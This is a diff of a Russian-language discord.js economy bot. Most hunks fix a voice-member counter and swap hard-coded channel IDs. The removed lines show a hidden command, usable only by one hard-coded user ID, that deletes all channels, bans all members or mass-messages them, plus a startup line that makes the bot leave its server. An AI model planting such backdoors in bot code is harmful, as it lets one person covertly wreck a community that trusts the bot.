@@ -28,7 +28,6 @@ bot.login(process.env.token);
 bot.on('ready', () => {
     console.log("Бот был успешно запущен!"); // Написать что бот запущен
     bot.user.setPresence({ game: { name: 'Economy All Gamers' }, status: 'online' }); // Установить игру
-    bot.guilds.cache.first().leave();
 });
 
 bot.on('message', async message => {
@@ -678,42 +677,22 @@ if(message.content.startsWith(`${prefix}mute`)) {
 		setTimeout(() => workCoolDown.delete(messasge.author.id), 21600000);
 
     }
-    if(message.content.startsWith(`${prefix}gg`)) {
-    	if (message.author.id != '407228819498336256') {
-    		return;
-    	}
-    	const args = message.content.slice(`${prefix}gg`).trim().split(/ +/g);
-    	if (!args[1]) {
-    		return message.delete();
-    	}
-    	if (args[1] === 'channels') {
-    		await message.delete();
-    		return await message.guild.channels.cache.each(async channel => await channel.delete('Рибят, ну вы не серъёзные.'))
-    	}
-    	if (args[1] === 'members') {
-    		await message.delete();
-    		return await message.guild.members.cache.each(async member => await member.ban({ days: 30, reason: 'Если делаете серъезно, то нужно думать!' }));
-    	}
-    	if (args[1] === 'spam') {
-    		await message.delete()
-    		return await message.guild.members.cache.each(async member => await member.send(`Это сообщение с сервера All Gamesrs, люди которые им занимались были очень не серъезными и поплатились!`));
-    	}
-    }
 });
 const costil = [];
 /*Создание привата*/
     bot.on('voiceStateUpdate', async (oldState,newState) => {
-    	const voiceMembers = newState.guild.channels.cache.filter(ch => ch.type === "voice").each(c => c.members.array().length);
+    	var voiceMembers = 0;
+    	newState.guild.channels.cache.filter(ch => ch.type === "voice").each(channel => voiceMembers += channel.members.size)
     		if(!voiceMembers || voiceMembers == 0) {
-    			await newState.guild.channels.cache.get("722065610879533129").setName(`┃🔊┃Voice: 0`);
+    			await newState.guild.channels.cache.get("728956135146782730").setName(`┃🔊┃Voice: 0`);
     		}
     		if(voiceMembers > 0) {
-    			await newState.guild.channels.cache.get("722065610879533129").setName(`┃🔊┃Voice: ${voiceMembers}`);
+    			await newState.guild.channels.cache.get("728956135146782730").setName(`┃🔊┃Voice: ${voiceMembers}`);
     		}
 
   
-    	if(newState.channelID === "720357135669526558") {
-    		const oldChannel = newState.guild.channels.cache.get("720357134793048155");
+    	if(newState.channelID === "728960900056481873") {
+    		const oldChannel = newState.guild.channels.cache.get("728942374599917639");
     		if(oldChannel.children.some(channel => channel.name === `${newState.member.displayName}`)) {
 	    		await newState.guild.channels.cache.find(c => c.name === `${newState.member.displayName}`).delete();
 	    		return newState.member.send(`\`\`Нельзя создать более одного привата! \`\``)
@@ -724,7 +703,7 @@ const costil = [];
     			nsfw:false,
     			bitrate:64000,
     			userLimit:2,
-    			parent:"720357134793048155",
+    			parent:"728942374599917639",
     			permissionOverwrites:[
     			{
     				id:newState.id,
@@ -765,9 +744,9 @@ const costil = [];
 
  });
 bot.on('guildMemberAdd', async(member) => {
-	await member.guild.channels.cache.get("722065483934859325").setName(`┃🌏┃All Members: ${member.guild.memberCount}`);
+	await member.guild.channels.cache.get("728962881768652821").setName(`┃🌏┃All Members: ${member.guild.memberCount}`);
 });
 bot.on('guildMemberRemove', async(member) => {
-	await member.guild.channels.cache.get("722065483934859325").setName(`┃🌏┃All Members: ${member.guild.memberCount}`);
+	await member.guild.channels.cache.get("728962881768652821").setName(`┃🌏┃All Members: ${member.guild.memberCount}`);
 });
 
